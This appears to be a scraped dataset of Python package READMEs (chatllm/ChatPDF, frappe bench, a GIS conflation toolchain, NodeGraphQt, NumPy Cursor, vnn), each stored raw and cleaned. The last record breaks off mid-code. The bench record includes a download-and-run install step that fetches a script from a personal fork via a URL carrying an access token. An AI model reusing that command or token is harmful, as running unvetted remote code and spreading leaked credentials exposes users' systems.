![img.png](data/imgs/role.png)

## ChatPDF

Click to ChatPDF

一键启动UI `chatllm-run webui --name chatpdf`

```python
from chatllm.applications.chatpdf import ChatPDF

qa = ChatPDF(encode_model='nghuyong/ernie-3.0-nano-zh')
qa.load_llm4chat(model_name_or_path=""THUDM/chatglm-6b"")
qa.create_index('财报.pdf')  # 构建知识库

list(qa(query='东北证券主营业务'))
# 根据已知信息，东北证券的主营业务为证券业务。公司作为证券公司，主要从事证券经纪、证券投资咨询、与证券交易、
# 证券投资活动有关的财务顾问、证券承销与保荐、证券自营、融资融券、证券投资基金代销和代销金融产品待业务。
```
- 支持查看召回结果
![向量召回结果](data/imgs/chatpdf.gif)



## Deploy


Click to Deploy

- ChatGLM-6B 模型硬件需求

    | **量化等级**   | **最低 GPU 显存**（推理） | **最低 GPU 显存**（高效参数微调） |
    | -------------- | ------------------------- | --------------------------------- |
    | FP16（无量化） | 13 GB                     | 14 GB                             |
    | INT8           | 8 GB                     | 9 GB                             |
    | INT4           | 6 GB                      | 7 GB                              |


- 从本地加载模型
  - [安装指南](docs/INSTALL.md)
  - [ChatGLM-6B Mac 本地部署实操记录](https://www.yuque.com/arvinxx/llm/chatglm-6b-deployment-on-mac)
  - [THUDM/ChatGLM-6B#从本地加载模型](https://github.com/THUDM/ChatGLM-6B#从本地加载模型)



## TODO

Click to TODO

- [ ] ChatLLM 应用
  - [x] 接入非结构化文档（已支持 md、pdf、docx、txt 文件格式）
  - [ ] 搜索引擎与本地网页接入
  - [ ] 结构化数据接入（如 csv、Excel、SQL 等）
  - [ ] 知识图谱/图数据库接入
  - [ ] 增加 ANN 后端，ES/RedisSearch【确保生产高可用】
  - [ ] 增加多级缓存缓存

- [ ] 多路召回
  - [ ] 问
    - [ ] 标量匹配
    - [x] 多种向量化，向量匹配
    - [ ] 增加相似问，换几个问法
    - [ ] 高置信度直接返回答案【匹配标准问】
  - [ ] 答
    - [ ] 高置信度篇章
    - [ ] 增加上下文信息
    - [ ] 增加夸篇章信息
    - [ ] 增加召回信息的相似信息
    - [ ] 提前生成标准问，匹配问
    - [ ] 拒绝推断


- [ ] 增加更多 LLM 模型支持
  - [x] [THUDM/chatglm-6b](https://huggingface.co/THUDM/chatglm-6b)
  - [ ] [THUDM/chatglm-6b-int8](https://huggingface.co/THUDM/chatglm-6b-int8)
  - [ ] [THUDM/chatglm-6b-int4](https://huggingface.co/THUDM/chatglm-6b-int4)
  - [ ] [THUDM/chatglm-6b-int4-qe](https://huggingface.co/THUDM/chatglm-6b-int4-qe)
  - [ ] [ClueAI/ChatYuan-large-v2](https://huggingface.co/ClueAI/ChatYuan-large-v2)
- [ ] 增加更多 Embedding 模型支持
  - [x] [nghuyong/ernie-3.0-nano-zh](https://huggingface.co/nghuyong/ernie-3.0-nano-zh)
  - [x] [nghuyong/ernie-3.0-base-zh](https://huggingface.co/nghuyong/ernie-3.0-base-zh)
  - [x] [shibing624/text2vec-base-chinese](https://huggingface.co/shibing624/text2vec-base-chinese)
  - [x] [GanymedeNil/text2vec-large-chinese](https://huggingface.co/GanymedeNil/text2vec-large-chinese)
- [x] 增加一键启动 webui
  - [x] 利用 streamlit 实现 ChatPDF，一键启动 `chatllm-run webui --name chatpdf`
  - [ ] 利用 gradio 实现 Web UI DEMO
  - [ ] 添加输出内容及错误提示
  - [ ] 引用标注
  - [ ] 增加知识库管理
    - [ ] 选择知识库开始问答
    - [ ] 上传文件/文件夹至知识库
    - [ ] 删除知识库中文件
- [ ] 增加 API 支持
  - [x] 利用 Fastapi/Flask/Grpc 实现流式接口 `chatllm-run flask-api --model_name_or_path  --host 127.0.0.1 --port 8000`
  - [ ] 前后端分离，实现调用 API 的 Web UI Demo

## 交流群
![二维码]()







=======
History
=======

0.0.0 (2023-04-11)
------------------

* First release on PyPI.
",yuanjie-ai/chatllm
ifrappe-bench,https://github.com/frappe/bench,9,11041,9716,"<div align=""center"">
	<picture>
		<source media=""(prefers-color-scheme: dark)"" srcset=""https://github.com/frappe/design/raw/master/logos/png/bench-logo-dark.png"">
		<img src=""https://github.com/frappe/design/raw/master/logos/png/bench-logo.png"" height=""128"">
	</picture>
	<h2>Bench</h2>
</div>

Bench is a command-line utility that helps you to install, update, and manage multiple sites for Frappe/ERPNext applications on [*nix systems](https://en.wikipedia.org/wiki/Unix-like) for development and production.

<div align=""center"">
	<a target=""_blank"" href=""https://www.python.org/downloads/"" title=""Python version"">
		<img src=""https://img.shields.io/badge/python-%3E=_3.7-green.svg"">
	</a>
	<a target=""_blank"" href=""https://app.travis-ci.com/github/frappe/bench"" title=""CI Status"">
		<img src=""https://app.travis-ci.com/frappe/bench.svg?branch=develop"">
	</a>
	<a target=""_blank"" href=""https://pypi.org/project/frappe-bench"" title=""PyPI Version"">
		<img src=""https://badge.fury.io/py/frappe-bench.svg"" alt=""PyPI version"">
	</a>
	<a target=""_blank"" title=""Platform Compatibility"">
		<img src=""https://img.shields.io/badge/platform-linux%20%7C%20osx-blue"">
	</a>
	<a target=""_blank"" href=""https://app.fossa.com/projects/git%2Bgithub.com%2Ffrappe%2Fbench?ref=badge_shield"" title=""FOSSA Status"">
		<img src=""https://app.fossa.com/api/projects/git%2Bgithub.com%2Ffrappe%2Fbench.svg?type=shield"">
	</a>
	<a target=""_blank"" href=""#LICENSE"" title=""License: GPLv3"">
		<img src=""https://img.shields.io/badge/License-GPLv3-blue.svg"">
	</a>
</div>

## Table of Contents

- [Table of Contents](#table-of-contents)
- [Installation](#installation)
	- [Containerized Installation](#containerized-installation)
	- [Easy Install Script](#easy-install-script)
		- [Setup](#setup)
		- [Arguments](#arguments)
		- [Troubleshooting](#troubleshooting)
	- [Manual Installation](#manual-installation)
- [Basic Usage](#basic-usage)
- [Custom Bench Commands](#custom-bench-commands)
- [Guides](#guides)
- [Resources](#resources)
- [Development](#development)
- [Releases](#releases)
- [License](#license)


## Installation

A typical bench setup provides two types of environments &mdash; Development and Production.

The setup for each of these installations can be achieved in multiple ways:

 - [Containerized Installation](#containerized-installation)
 - [Manual Installation](#manual-installation)

We recommend using Docker Installation to setup a Production Environment. For Development, you may choose either of the two methods to setup an instance.

Otherwise, if you are looking to evaluate Frappe apps without hassle of hosting, you can try them [on frappecloud.com](https://frappecloud.com/).


### Containerized Installation

A Frappe/ERPNext instance can be setup and replicated easily using [Docker](https://docker.com). The officially supported Docker installation can be used to setup either of both Development and Production environments.

To setup either of the environments, you will need to clone the official docker repository:

```sh
$ git clone https://github.com/frappe/frappe_docker.git
$ cd frappe_docker
```

A quick setup guide for both the environments can be found below. For more details, check out the [Frappe/ERPNext Docker Repository](https://github.com/frappe/frappe_docker).

### Easy Install Script

The Easy Install script should get you going with a Frappe/ERPNext setup with minimal manual intervention and effort.

This script uses Docker with the [Frappe/ERPNext Docker Repository](https://github.com/frappe/frappe_docker) and can be used for both Development setup and Production setup.

#### Setup

Download the Easy Install script and execute it:

```sh
OBS: gerar essa URL com um token valido quando usar...
$ wget https://raw.githubusercontent.com/HarryPaulo/bench/version-14/easy-install.py?token=GHSAT0AAAAAAB4FNP6WETPRAHXLBGVEG4C2ZCIGD7A -O easy-install.py
$ python3 easy-install.py --prod --email your@email.tld
```

This script will install docker on your system and will fetch the required containers, setup bench and a default ERPNext instance.

The script will generate MySQL root password and an Administrator password for the Frappe/ERPNext instance, which will then be saved under `$HOME/passwords.txt` of the user used to setup the instance.
It will also generate a new compose file under `$HOME/<project-name>-compose.yml`.

When the setup is complete, you will be able to access the system at `http://<your-server-ip>`, wherein you can use the Administrator password to login.

#### Arguments

Here are the arguments for the easy-install script

```txt
usage: easy-install.py [-h] [-p] [-d] [-s SITENAME] [-n PROJECT] [--email EMAIL]

Install Frappe with Docker

options:
  -h, --help            		show this help message and exit
  -p, --prod            		Setup Production System
  -d, --dev             		Setup Development System
  -s SITENAME, --sitename SITENAME      The Site Name for your production site
  -n PROJECT, --project PROJECT         Project Name
  --email EMAIL         		Add email for the SSL.
```

#### Troubleshooting

In case the setup fails, the log file is saved under `$HOME/easy-install.log`. You may then

- Create an Issue in this repository with the log file attached.

### Manual Installation

Some might want to manually setup a bench instance locally for development. To quickly get started on installing bench the hard way, you can follow the guide on [Installing Bench and the Frappe Framework](https://frappe.io/docs/user/en/installation).

You'll have to set up the system dependencies required for setting up a Frappe Environment. Checkout [docs/installation](https://github.com/frappe/bench/blob/develop/docs/installation.md) for more information on this. If you've already set up, install bench via pip:


```sh
$ pip install frappe-bench
```


## Basic Usage

**Note:** Apart from `bench init`, all other bench commands are expected to be run in the respective bench directory.

 * Create a new bench:

	```sh
	$ bench init [bench-name]
	```

 * Add a site under current bench:

	```sh
	$ bench new-site [site-name]
	```
	- **Optional**: If the database for the site does not reside on localhost or listens on a custom port, you can use the flags `--db-host` to set a custom host and/or `--db-port` to set a custom port.

		```sh
		$ bench new-site [site-name] --db-host [custom-db-host-ip] --db-port [custom-db-port]
		```

 * Download and add applications to bench:

	```sh
	$ bench get-app [app-name] [app-link]
	```

 * Install apps on a particular site

	```sh
	$ bench --site [site-name] install-app [app-name]
	```

 * Start bench (only for development)

	```sh
	$ bench start
	```

 * Show bench help:

	```sh
	$ bench --help
	```


For more in-depth information on commands and their usage, follow [Commands and Usage](https://github.com/frappe/bench/blob/develop/docs/commands_and_usage.md). As for a consolidated list of bench commands, check out [Bench Usage](https://github.com/frappe/bench/blob/develop/docs/bench_usage.md).


## Custom Bench Commands

If you wish to extend the capabilities of bench with your own custom Frappe Application, you may follow [Adding Custom Bench Commands](https://github.com/frappe/bench/blob/develop/docs/bench_custom_cmd.md).


## Guides

- [Configuring HTTPS](https://frappe.io/docs/user/en/bench/guides/configuring-https.html)
- [Using Let's Encrypt to setup HTTPS](https://frappe.io/docs/user/en/bench/guides/lets-encrypt-ssl-setup.html)
- [Diagnosing the Scheduler](https://frappe.io/docs/user/en/bench/guides/diagnosing-the-scheduler.html)
- [Change Hostname](https://frappe.io/docs/user/en/bench/guides/adding-custom-domains)
- [Manual Setup](https://frappe.io/docs/user/en/bench/guides/manual-setup.html)
- [Setup Production](https://frappe.io/docs/user/en/bench/guides/setup-production.html)
- [Setup Multitenancy](https://frappe.io/docs/user/en/bench/guides/setup-multitenancy.html)
- [Stopping Production](https://github.com/frappe/bench/wiki/Stopping-Production-and-starting-Development)

For an exhaustive list of guides, check out [Bench Guides](https://frappe.io/docs/user/en/bench/guides).


## Resources

- [Bench Commands Cheat Sheet](https://frappe.io/docs/user/en/bench/resources/bench-commands-cheatsheet.html)
- [Background Services](https://frappe.io/docs/user/en/bench/resources/background-services.html)
- [Bench Procfile](https://frappe.io/docs/user/en/bench/resources/bench-procfile.html)

For an exhaustive list of resources, check out [Bench Resources](https://frappe.io/docs/user/en/bench/resources).


## Development

To contribute and develop on the bench CLI tool, clone this repo and create an editable install. In editable mode, you may get the following warning everytime you run a bench command:

	WARN: bench is installed in editable mode!

	This is not the recommended mode of installation for production. Instead, install the package from PyPI with: `pip install frappe-bench`


```sh
$ git clone https://github.com/frappe/bench ~/bench-repo
$ pip3 install -e ~/bench-repo
$ bench src
/Users/frappe/bench-repo
```

To clear up the editable install and switch to a stable version of bench, uninstall via pip and delete the corresponding egg file from the python path.


```sh
# Delete bench installed in editable install
$ rm -r $(find ~ -name '*.egg-info')
$ pip3 uninstall frappe-bench

# Install latest released version of bench
$ pip3 install -U frappe-bench
```

To confirm the switch, check the output of `bench src`. It should change from something like `$HOME/bench-repo` to `/usr/local/lib/python3.6/dist-packages` and stop the editable install warnings from getting triggered at every command.


## Releases

Bench's version information can be accessed via `bench.VERSION` in the package's __init__.py file. Eversince the v5.0 release, we've started publishing releases on GitHub, and PyPI.

GitHub: https://github.com/frappe/bench/releases

PyPI: https://pypi.org/project/frappe-bench


From v5.3.0, we partially automated the release process using [@semantic-release](.github/workflows/release.yml). Under this new pipeline, we do the following steps to make a release:

1. Merge `develop` into the `staging` branch
1. Merge `staging` into the latest stable branch, which is `v5.x` at this point.

This triggers a GitHub Action job that generates a bump commit, drafts and generates a GitHub release, builds a Python package and publishes it to PyPI.

The intermediate `staging` branch exists to mediate the `bench.VERSION` conflict that would arise while merging `develop` and stable. On develop, the version has to be manually updated (for major release changes). The version tag plays a role in deciding when checks have to be made for new Bench releases.

> Note: We may want to kill the convention of separate branches for different version releases of Bench. We don't need to maintain this the way we do for Frappe & ERPNext. A single branch named `stable` would sustain.

## License

This repository has been released under the [GNU GPLv3 License](LICENSE).
","




Bench


Bench is a command-line utility that helps you to install, update, and manage multiple sites for Frappe/ERPNext applications on [*nix systems](https://en.wikipedia.org/wiki/Unix-like) for development and production.






















## Table of Contents

- [Table of Contents](#table-of-contents)
- [Installation](#installation)
	- [Containerized Installation](#containerized-installation)
	- [Easy Install Script](#easy-install-script)
		- [Setup](#setup)
		- [Arguments](#arguments)
		- [Troubleshooting](#troubleshooting)
	- [Manual Installation](#manual-installation)
- [Basic Usage](#basic-usage)
- [Custom Bench Commands](#custom-bench-commands)
- [Guides](#guides)
- [Resources](#resources)
- [Development](#development)
- [Releases](#releases)
- [License](#license)


## Installation

A typical bench setup provides two types of environments — Development and Production.

The setup for each of these installations can be achieved in multiple ways:

 - [Containerized Installation](#containerized-installation)
 - [Manual Installation](#manual-installation)

We recommend using Docker Installation to setup a Production Environment. For Development, you may choose either of the two methods to setup an instance.

Otherwise, if you are looking to evaluate Frappe apps without hassle of hosting, you can try them [on frappecloud.com](https://frappecloud.com/).


### Containerized Installation

A Frappe/ERPNext instance can be setup and replicated easily using [Docker](https://docker.com). The officially supported Docker installation can be used to setup either of both Development and Production environments.

To setup either of the environments, you will need to clone the official docker repository:

```sh
$ git clone https://github.com/frappe/frappe_docker.git
$ cd frappe_docker
```

A quick setup guide for both the environments can be found below. For more details, check out the [Frappe/ERPNext Docker Repository](https://github.com/frappe/frappe_docker).

### Easy Install Script

The Easy Install script should get you going with a Frappe/ERPNext setup with minimal manual intervention and effort.

This script uses Docker with the [Frappe/ERPNext Docker Repository](https://github.com/frappe/frappe_docker) and can be used for both Development setup and Production setup.

#### Setup

Download the Easy Install script and execute it:

```sh
OBS: gerar essa URL com um token valido quando usar...
$ wget https://raw.githubusercontent.com/HarryPaulo/bench/version-14/easy-install.py?token=GHSAT0AAAAAAB4FNP6WETPRAHXLBGVEG4C2ZCIGD7A -O easy-install.py
$ python3 easy-install.py --prod --email your@email.tld
```

This script will install docker on your system and will fetch the required containers, setup bench and a default ERPNext instance.

The script will generate MySQL root password and an Administrator password for the Frappe/ERPNext instance, which will then be saved under `$HOME/passwords.txt` of the user used to setup the instance.
It will also generate a new compose file under `$HOME/-compose.yml`.

When the setup is complete, you will be able to access the system at `http://`, wherein you can use the Administrator password to login.

#### Arguments

Here are the arguments for the easy-install script

```txt
usage: easy-install.py [-h] [-p] [-d] [-s SITENAME] [-n PROJECT] [--email EMAIL]

Install Frappe with Docker

options:
  -h, --help            		show this help message and exit
  -p, --prod            		Setup Production System
  -d, --dev             		Setup Development System
  -s SITENAME, --sitename SITENAME      The Site Name for your production site
  -n PROJECT, --project PROJECT         Project Name
  --email EMAIL         		Add email for the SSL.
```

#### Troubleshooting

In case the setup fails, the log file is saved under `$HOME/easy-install.log`. You may then

- Create an Issue in this repository with the log file attached.

### Manual Installation

Some might want to manually setup a bench instance locally for development. To quickly get started on installing bench the hard way, you can follow the guide on [Installing Bench and the Frappe Framework](https://frappe.io/docs/user/en/installation).

You'll have to set up the system dependencies required for setting up a Frappe Environment. Checkout [docs/installation](https://github.com/frappe/bench/blob/develop/docs/installation.md) for more information on this. If you've already set up, install bench via pip:


```sh
$ pip install frappe-bench
```


## Basic Usage

**Note:** Apart from `bench init`, all other bench commands are expected to be run in the respective bench directory.

 * Create a new bench:

	```sh
	$ bench init [bench-name]
	```

 * Add a site under current bench:

	```sh
	$ bench new-site [site-name]
	```
	- **Optional**: If the database for the site does not reside on localhost or listens on a custom port, you can use the flags `--db-host` to set a custom host and/or `--db-port` to set a custom port.

		```sh
		$ bench new-site [site-name] --db-host [custom-db-host-ip] --db-port [custom-db-port]
		```

 * Download and add applications to bench:

	```sh
	$ bench get-app [app-name] [app-link]
	```

 * Install apps on a particular site

	```sh
	$ bench --site [site-name] install-app [app-name]
	```

 * Start bench (only for development)

	```sh
	$ bench start
	```

 * Show bench help:

	```sh
	$ bench --help
	```


For more in-depth information on commands and their usage, follow [Commands and Usage](https://github.com/frappe/bench/blob/develop/docs/commands_and_usage.md). As for a consolidated list of bench commands, check out [Bench Usage](https://github.com/frappe/bench/blob/develop/docs/bench_usage.md).


## Custom Bench Commands

If you wish to extend the capabilities of bench with your own custom Frappe Application, you may follow [Adding Custom Bench Commands](https://github.com/frappe/bench/blob/develop/docs/bench_custom_cmd.md).


## Guides

- [Configuring HTTPS](https://frappe.io/docs/user/en/bench/guides/configuring-https.html)
- [Using Let's Encrypt to setup HTTPS](https://frappe.io/docs/user/en/bench/guides/lets-encrypt-ssl-setup.html)
- [Diagnosing the Scheduler](https://frappe.io/docs/user/en/bench/guides/diagnosing-the-scheduler.html)
- [Change Hostname](https://frappe.io/docs/user/en/bench/guides/adding-custom-domains)
- [Manual Setup](https://frappe.io/docs/user/en/bench/guides/manual-setup.html)
- [Setup Production](https://frappe.io/docs/user/en/bench/guides/setup-production.html)
- [Setup Multitenancy](https://frappe.io/docs/user/en/bench/guides/setup-multitenancy.html)
- [Stopping Production](https://github.com/frappe/bench/wiki/Stopping-Production-and-starting-Development)

For an exhaustive list of guides, check out [Bench Guides](https://frappe.io/docs/user/en/bench/guides).


## Resources

- [Bench Commands Cheat Sheet](https://frappe.io/docs/user/en/bench/resources/bench-commands-cheatsheet.html)
- [Background Services](https://frappe.io/docs/user/en/bench/resources/background-services.html)
- [Bench Procfile](https://frappe.io/docs/user/en/bench/resources/bench-procfile.html)

For an exhaustive list of resources, check out [Bench Resources](https://frappe.io/docs/user/en/bench/resources).


## Development

To contribute and develop on the bench CLI tool, clone this repo and create an editable install. In editable mode, you may get the following warning everytime you run a bench command:

	WARN: bench is installed in editable mode!

	This is not the recommended mode of installation for production. Instead, install the package from PyPI with: `pip install frappe-bench`


```sh
$ git clone https://github.com/frappe/bench ~/bench-repo
$ pip3 install -e ~/bench-repo
$ bench src
/Users/frappe/bench-repo
```

To clear up the editable install and switch to a stable version of bench, uninstall via pip and delete the corresponding egg file from the python path.


```sh
# Delete bench installed in editable install
$ rm -r $(find ~ -name '*.egg-info')
$ pip3 uninstall frappe-bench

# Install latest released version of bench
$ pip3 install -U frappe-bench
```

To confirm the switch, check the output of `bench src`. It should change from something like `$HOME/bench-repo` to `/usr/local/lib/python3.6/dist-packages` and stop the editable install warnings from getting triggered at every command.


## Releases

Bench's version information can be accessed via `bench.VERSION` in the package's __init__.py file. Eversince the v5.0 release, we've started publishing releases on GitHub, and PyPI.

GitHub: https://github.com/frappe/bench/releases

PyPI: https://pypi.org/project/frappe-bench


From v5.3.0, we partially automated the release process using [@semantic-release](.github/workflows/release.yml). Under this new pipeline, we do the following steps to make a release:

1. Merge `develop` into the `staging` branch
1. Merge `staging` into the latest stable branch, which is `v5.x` at this point.

This triggers a GitHub Action job that generates a bump commit, drafts and generates a GitHub release, builds a Python package and publishes it to PyPI.

The intermediate `staging` branch exists to mediate the `bench.VERSION` conflict that would arise while merging `develop` and stable. On develop, the version has to be manually updated (for major release changes). The version tag plays a role in deciding when checks have to be made for new Bench releases.

> Note: We may want to kill the convention of separate branches for different version releases of Bench. We don't need to maintain this the way we do for Frappe & ERPNext. A single branch named `stable` would sustain.

## License

This repository has been released under the [GNU GPLv3 License](LICENSE).
",frappe/bench
gis-conflation-toolchain,https://github.com/fititnt/spatial-data-conflation-open-toolchain,0,2048,1084,"# spatial-data-conflation-open-toolchain
**[EARLY DRAFT] Open, free to use, toolchain for geospatial data conflation. Command-line interface for file manipulation.** _See geojson-diff.py from <https://github.com/fititnt/openstreetmap-vs-dados-abertos-brasil>._

[![GitHub](https://img.shields.io/badge/GitHub-fititnt%20spatial--data--conflation--open--toolchain-lightgrey?logo=github&style=social[fititnt/geojson-diff] ""GitHub"")](https://github.com/fititnt/spatial-data-conflation-open-toolchain)

[![Pypi: gis-conflation-toolchain](https://img.shields.io/badge/python%20pypi-gis--conflation--toolchain-brightgreen[Python] 
 ""Pypi: gis-conflation-toolchain"")](https://pypi.org/project/gis-conflation-toolchain)


## Installing

```bash
# @TODO release this as pip package
pip install --upgrade git+https://github.com/fititnt/spatial-data-conflation-open-toolchain.git#egg=gis-conflation-toolchain
```

<!--
-  Saalfield, Alan. Conflation: Automated Map Compilation. BUREAU OF THE CENSUS STATISTICAL RESEARCH DIVISION REPORT SERIES, SRD Research Report Number: Census/SRD/RR-87124
  - https://www.census.gov/content/dam/Census/library/working-papers/1987/adrm/rr87-24.pdf
- Lynch, M. and A. Saalfeld, 1985, ""Conflation: Automated Map Compilation, a Video Game Approach"", Proceedings, Auto-Carto VII
  - https://cartogis.org/docs/proceedings/archive/auto-carto-7/pdf/conflation-automated-map-compilation-a-video-game-approach.pdf
-->

## Toolchain

### csv2excel
- [doc/csv2excel-help.md](doc/csv2excel-help.md)

### csv2geojson
- [doc/csv2geojson-help.md](doc/csv2geojson-help.md)

### geojsondiff
- [doc/geojsondiff-help.md](doc/geojsondiff-help.md)

<!--

osmf2geojson
osmf2geojson tests/data/test2.osm

# https://docs.osmcode.org/osmium/latest/osmium-sort.html
osmium sort -o tests/data/test2-v2.osm tests/data/test2.osm
osmium sort -o tests/data/test1-v2.osm tests/data/test1.osm
osmf2geojson tests/data/test2-v2.osm > tests/temp/test2-v2.geojson
osmf2geojson tests/data/test1-v2.osm > tests/temp/test1-v2.geojson
-->

## License

Public domain
","# spatial-data-conflation-open-toolchain
**[EARLY DRAFT] Open, free to use, toolchain for geospatial data conflation. Command-line interface for file manipulation.** _See geojson-diff.py from ._

[![GitHub](https://img.shields.io/badge/GitHub-fititnt%20spatial--data--conflation--open--toolchain-lightgrey?logo=github&style=social[fititnt/geojson-diff] ""GitHub"")](https://github.com/fititnt/spatial-data-conflation-open-toolchain)

[![Pypi: gis-conflation-toolchain](https://img.shields.io/badge/python%20pypi-gis--conflation--toolchain-brightgreen[Python] 
 ""Pypi: gis-conflation-toolchain"")](https://pypi.org/project/gis-conflation-toolchain)


## Installing

```bash
# @TODO release this as pip package
pip install --upgrade git+https://github.com/fititnt/spatial-data-conflation-open-toolchain.git#egg=gis-conflation-toolchain
```



## Toolchain

### csv2excel
- [doc/csv2excel-help.md](doc/csv2excel-help.md)

### csv2geojson
- [doc/csv2geojson-help.md](doc/csv2geojson-help.md)

### geojsondiff
- [doc/geojsondiff-help.md](doc/geojsondiff-help.md)



## License

Public domain
",fititnt/spatial-data-conflation-open-toolchain
nodegraphqt,https://github.com/jchanvfx/NodeGraphQt/,2,1599,770,"
# NodeGraphQt

<p align=""center"">
    <a href=""https://jchanvfx.github.io/NodeGraphQt"" target=""_blank"">
    <img src=""https://raw.githubusercontent.com/jchanvfx/NodeGraphQt/main/docs/_images/logo.png"" title=""logo"">
    </a>
</p>

``NodeGraphQt`` is a node graph UI framework for `PySide2` that can be implemented and re-purposed into 
applications.

<img src=""https://raw.githubusercontent.com/jchanvfx/NodeGraphQt/main/docs/_images/screenshot.png"" width=""100%"" title=""NodeGraphQt"">


## Documentation

<a href=""https://jchanvfx.github.io/NodeGraphQt"" target=""_blank"">https://jchanvfx.github.io/NodeGraphQt</a>

See the [basic_example.py](/examples/basic_example.py) python script from this repo.

More examples can be found in the API documentation:<br>
https://jchanvfx.github.io/NodeGraphQt/api/html/examples/ex_overview.html#simple-example

## Vertical Layout

https://jchanvfx.github.io/NodeGraphQt/api/html/examples/ex_pipe.html#layout-direction

<img src=""https://raw.githubusercontent.com/jchanvfx/NodeGraphQt/main/docs/_images/vertical_layout.png"" width=""800"" title=""Vertical Layout"">

## Pipe Layout

https://jchanvfx.github.io/NodeGraphQt/api/html/examples/ex_pipe.html#layout-styles

<img src=""https://raw.githubusercontent.com/jchanvfx/NodeGraphQt/main/docs/_images/pipe_layout_types.gif"" width=""600"" title=""Pipe Layout"">

## Custom Widgets

https://jchanvfx.github.io/NodeGraphQt/api/html/custom_widgets.html

<img src=""https://raw.githubusercontent.com/jchanvfx/NodeGraphQt/main/docs/_images/prop_bin.png"" width=""600"" title=""Properties Bin"">
","
# NodeGraphQt







``NodeGraphQt`` is a node graph UI framework for `PySide2` that can be implemented and re-purposed into 
applications.




## Documentation

https://jchanvfx.github.io/NodeGraphQt

See the [basic_example.py](/examples/basic_example.py) python script from this repo.

More examples can be found in the API documentation:
https://jchanvfx.github.io/NodeGraphQt/api/html/examples/ex_overview.html#simple-example

## Vertical Layout

https://jchanvfx.github.io/NodeGraphQt/api/html/examples/ex_pipe.html#layout-direction



## Pipe Layout

https://jchanvfx.github.io/NodeGraphQt/api/html/examples/ex_pipe.html#layout-styles



## Custom Widgets

https://jchanvfx.github.io/NodeGraphQt/api/html/custom_widgets.html


",jchanvfx/nodegraphqt
numpy-cursor,https://github.com/NikGariel/NumPy-Cursor,0,1403,1403,"NumPy Cursor
============

This repository contains a Python implementation of a cursor for NumPy matrices. The cursor allows you to conveniently move through a matrix and read or modify its values.

The cursor class has the following methods:

*   `__init__(self, matrix)`: Initializes the cursor with a NumPy matrix.
*   `left(self, steps=1)`: Moves the cursor left by `steps` columns.
*   `right(self, steps=1)`: Moves the cursor right by `steps` columns.
*   `up(self, steps=1)`: Moves the cursor up by `steps` rows.
*   `down(self, steps=1)`: Moves the cursor down by `steps` rows.
*   `move(self, row_steps, col_steps)`: Moves the cursor by `row_steps` rows and `col_steps` columns.
*   `set(self, row, col)`: Set the cursor by `row` rows and `col` columns.
*   `coordinates`: Returns the current row and column coordinates of the cursor.
*   `isEmpty`: Returns `True` if the value of the matrix at the current cursor position is zero, and `False` otherwise.
*   `setItem(self, item)`: Setting the value of the cursor cell by `item`.
*   `__repr__(self)`: Returns a string representation of the value of the matrix at the current cursor position.
*   `__str__(self)`: Returns a string representation of the value of the matrix at the current cursor position.

The implementation also includes error checking to prevent moving the cursor beyond the boundaries of the matrix.

","NumPy Cursor
============

This repository contains a Python implementation of a cursor for NumPy matrices. The cursor allows you to conveniently move through a matrix and read or modify its values.

The cursor class has the following methods:

*   `__init__(self, matrix)`: Initializes the cursor with a NumPy matrix.
*   `left(self, steps=1)`: Moves the cursor left by `steps` columns.
*   `right(self, steps=1)`: Moves the cursor right by `steps` columns.
*   `up(self, steps=1)`: Moves the cursor up by `steps` rows.
*   `down(self, steps=1)`: Moves the cursor down by `steps` rows.
*   `move(self, row_steps, col_steps)`: Moves the cursor by `row_steps` rows and `col_steps` columns.
*   `set(self, row, col)`: Set the cursor by `row` rows and `col` columns.
*   `coordinates`: Returns the current row and column coordinates of the cursor.
*   `isEmpty`: Returns `True` if the value of the matrix at the current cursor position is zero, and `False` otherwise.
*   `setItem(self, item)`: Setting the value of the cursor cell by `item`.
*   `__repr__(self)`: Returns a string representation of the value of the matrix at the current cursor position.
*   `__str__(self)`: Returns a string representation of the value of the matrix at the current cursor position.

The implementation also includes error checking to prevent moving the cursor beyond the boundaries of the matrix.

",nikgariel/numpy-cursor
diverge,https://github.com/zjupgx/diverge,4,0,0,,,zjupgx/diverge
vnn,https://github.com/iliiliiliili/variational-nn-pytorch,0,4522,4522,"# Variational Neural Networks Pytorch

This repository contains a Pytorch implementation of Variational Neural Networks (VNNs) and image classification experiments for [Variational Neural Networks paper](https://arxiv.org/abs/2207.01524).

The corresponding package contains layer implementations for VNNs and other used architectures. It can be installed using `pip install vnn`.

Bayesian Neural Networks (BNNs) provide a tool to estimate the uncertainty of a neural network by considering a distribution over weights and sampling different models for each input. In this paper, we propose a method for uncertainty estimation in neural networks called Variational Neural Network that, instead of considering a distribution over weights, generates parameters for the output distribution of a layer by transforming its inputs with learnable sub-layers. In uncertainty quality estimation experiments, we show that VNNs achieve better uncertainty quality than Monte Carlo Dropout or Bayes By Backpropagation methods.

## Run

Use `run_example.sh` to train and evaluate a single model on MNIST.
The corresponding reproducible capsule is available at [CodeOcean](https://codeocean.com/capsule/9585164/tree).

## Package
Use `pip install vnn` or `python3 -m pip install vnn` to install the package.
The package includes only the layer implementations of VNNs, as well as dropout, functional and classic layers.
These layers are implemented with the same interface, making it easy to implement different versions of your desired network by changing the class names.

An example of a simple convolutional network:
```python
import torch
from vnn import VariationalConvolution, VariationalLinear

class Based(torch.nn.Module):

    def __init__(self, **kwargs) -> None:

        super().__init__()

        self.model = nn.Sequential(
            VariationalConvolution(1, 256, 9, 1, **kwargs),
            VariationalConvolution(256, 256, 9, 2, **kwargs),
            VariationalConvolution(256, 16, 4, 1, **kwargs),
            torch.nn.Flatten(start_dim=1),
            VariationalLinear(3 * 3 * 16, 10, **kwargs),
        )

    def forward(self, x):

        return self.model(x)
```

The same classic network:

```python
import torch
from vnn.classic import ClassicConvolution, ClassicLinear

class Based(torch.nn.Module):

    def __init__(self, **kwargs) -> None:

        super().__init__()

        self.model = nn.Sequential(
            ClassicConvolution(1, 256, 9, 1, **kwargs),
            ClassicConvolution(256, 256, 9, 2, **kwargs),
            ClassicConvolution(256, 16, 4, 1, **kwargs),
            torch.nn.Flatten(start_dim=1),
            ClassicLinear(3 * 3 * 16, 10, **kwargs),
        )

    def forward(self, x):

        return self.model(x)
```

Or a generalized network class:
```python
import torch
from vnn import VariationalConvolution, VariationalLinear
from vnn.classic import ClassicConvolution, ClassicLinear
from vnn.dropout import DropoutConvolution, DropoutLinear
from vnn.functional import FunctionalConvolution, FunctionalLinear

def create_based(Convolution, Linear):
    class Based(torch.nn.Module):

        def __init__(self, **kwargs) -> None:

            super().__init__()

            self.model = nn.Sequential(
                Convolution(1, 256, 9, 1, **kwargs),
